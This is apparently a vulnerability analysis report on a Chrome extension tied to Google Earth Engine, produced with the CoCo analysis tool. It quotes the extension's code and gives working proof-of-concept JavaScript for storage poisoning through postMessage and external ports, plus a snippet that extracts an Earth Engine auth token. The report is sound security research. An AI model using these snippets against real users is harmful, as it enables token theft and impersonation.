# CoCo Analysis: dhkobehdekjgdahfldleahkekjffibhg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 16 (grouped into 3 distinct vulnerability patterns)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (Complete Storage Exploitation Chain)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dhkobehdekjgdahfldleahkekjffibhg/opgen_generated_files/cs_0.js
Line 517		window.addEventListener("message", (event) => {
Line 519				event.data &&
Line 530				listConnector[event.data.connectInfo.name].postMessage(event.data.message);
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dhkobehdekjgdahfldleahkekjffibhg/opgen_generated_files/bg.js
Line 1018				chrome.storage.local.set({lightMode: request.message});
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point: window.postMessage listener
window.addEventListener("message", (event) => {
    if (event.source == window &&
        event.data &&  // ← attacker-controlled
        event.data.direction == "p2e") {
        if(listConnector[event.data.connectInfo.name]==undefined){
            listConnector[event.data.connectInfo.name]=browser.runtime.connect(browser.runtime.id,event.data.connectInfo);
            listConnector[event.data.connectInfo.name].onMessage.addListener(function(val){
                window.postMessage({message:val,connectInfo:event.data.connectInfo,direction:"e2p"}) // Leaks back to page
            })
        }
        listConnector[event.data.connectInfo.name].postMessage(event.data.message); // ← attacker-controlled message
    }
});

// Background script (bg.js) - Port message handler
function addListenerOnNewPort(port){
    port.onMessage.addListener((request, sender, sendResponse) => {
        if(request.type=='setLightMode'){
            chrome.storage.local.set({lightMode: request.message}); // ← attacker-controlled data stored
            for (var i = listPort.length - 1; i >= 0; i--) {
                listPort[i].postMessage({ type:'changeLightMode', message: request.message });
            }
        }
    });
}

chrome.runtime.onConnect.addListener(portConnection);

// Storage retrieval path - Background sends storage data to external ports
chrome.storage.local.get(['lightMode'], function(mode) {
    if('lightMode' in mode)
        sender.postMessage({ type:'changeLightMode', message: mode['lightMode'] }); // ← sends back to port
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// From a webpage where the content script runs (https://code.earthengine.google.com/*)

// Step 1: Poison storage with malicious data
window.postMessage({
    direction: "p2e",
    connectInfo: {name: "oeel.extension.lightMode"},
    message: {type: "setLightMode", message: "attacker_controlled_value"}
}, "*");

// Step 2: The content script forwards this to background via port connection
// Step 3: Background stores it in chrome.storage.local
// Step 4: Background reads storage and sends back via port.postMessage
// Step 5: Content script receives via port.onMessage and posts to window
// Step 6: Attacker's page receives the poisoned value via window.addEventListener("message")
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.local and retrieve it back. The extension acts as a storage proxy, allowing the webpage to persist and retrieve arbitrary data across sessions using the extension's privileged storage API.

---

## Sink 2: storage_local_get_source → bg_external_port_postMessage_sink (Information Disclosure)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dhkobehdekjgdahfldleahkekjffibhg/opgen_generated_files/bg.js
Line 751	    var storage_local_get_source = {'key': 'value'};
Line 1051				ports.map((sender)=>sender.postMessage({ type:'parallelUpload', message: data['parallelUpload'] }));
Line 1054				ports.map((sender)=>sender.postMessage({ type:'parallelDownload', message: data['parallelDownload'] }));
Line 1229				ports.map((sender)=>sender.postMessage({ type:'planetConfig', message: data['planetConfig'] }));
```

**Code:**

```javascript
// Background script - External port connections (whitelisted domains)
chrome.runtime.onConnectExternal.addListener(PlanetPortConnection);

function PlanetPortConnection(port) {
    if(port.name === "oeel.extension.planet"){
        listPlanetPort.push(port);
        sendPlanetConfig(port); // Automatically sends storage data on connection

        port.onMessage.addListener((request, sender, sendResponse) => {
            if(request.type=='setPlanetConfig'){
                chrome.storage.local.set({planetConfig: request.message}); // ← attacker writes
                sendPlanetConfig(listPlanetPort); // ← immediately reads and broadcasts
            }
        });
    }
}

function sendPlanetConfig(ports=listPlanetPort){
    chrome.storage.local.get(['planetConfig'], function(data) {
        if('planetConfig' in data){
            ports.map((sender)=>sender.postMessage({
                type:'planetConfig',
                message: data['planetConfig'] // ← attacker-controlled data sent back
            }));
        }
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.connectExternal from whitelisted domains

**Attack:**

```javascript
// From a whitelisted domain (e.g., https://code.earthengine.google.com/*)

// Connect to extension via external port
const port = chrome.runtime.connect("extension_id", {name: "oeel.extension.planet"});

// Step 1: Write malicious data to storage
port.postMessage({
    type: 'setPlanetConfig',
    message: {malicious: "data", apiKey: "stolen_key"}
});

// Step 2: Extension immediately reads and sends back via port.postMessage
port.onMessage.addListener((msg) => {
    if(msg.type === 'planetConfig') {
        console.log("Retrieved poisoned data:", msg.message); // ← attacker receives data back
    }
});
```

**Impact:** Complete storage exploitation - whitelisted domains can write arbitrary data to storage and retrieve it back. This creates a persistent storage channel that external websites can abuse.

---

## Sink 3: fetch_source → sendResponseExternal_sink (Sensitive Data Exfiltration)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dhkobehdekjgdahfldleahkekjffibhg/opgen_generated_files/bg.js
Line 265	    var responseText = 'data_from_fetch';
Line 1266				const match = data.match(authTokenRegex);
Line 1267				if (match && match[1]) {
```

**Code:**

```javascript
// Background script - External message handler
function requestAuth(request, sender, sendResponse) {
    const regex = /^https:\/\/.*-colab\.googleusercontent\.com.*$/;
    if((sender.origin=="https://colab.research.google.com"|| regex.test(sender.origin))&&request=="getAuthTocken"){
        fetch('https://code.earthengine.google.com/')
        .then(response => response.text())
        .then(data => {  // ← data from Google Earth Engine
            const authTokenRegex = /"authToken":\s*"([^"]+)"/;
            const match = data.match(authTokenRegex);
            if (match && match[1]) {
                const authToken = match[1];  // ← Sensitive auth token extracted
                sendResponse({ type:'authToken', message: authToken }) // ← Sent to external caller
            }
        })
    }
}

chrome.runtime.onMessageExternal.addListener(requestAuth);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.sendMessage from whitelisted domains

**Attack:**

```javascript
// From whitelisted domain (e.g., https://colab.research.google.com/*)

chrome.runtime.sendMessage("extension_id", "getAuthTocken", (response) => {
    if(response.type === 'authToken') {
        console.log("Stolen Earth Engine auth token:", response.message);
        // Attacker can now use this token to authenticate as the victim
        // on Google Earth Engine services
    }
});
```

**Impact:** Sensitive data exfiltration - whitelisted domains can request and receive Google Earth Engine authentication tokens. This allows the attacker to impersonate the victim on Earth Engine services, accessing their data and resources.
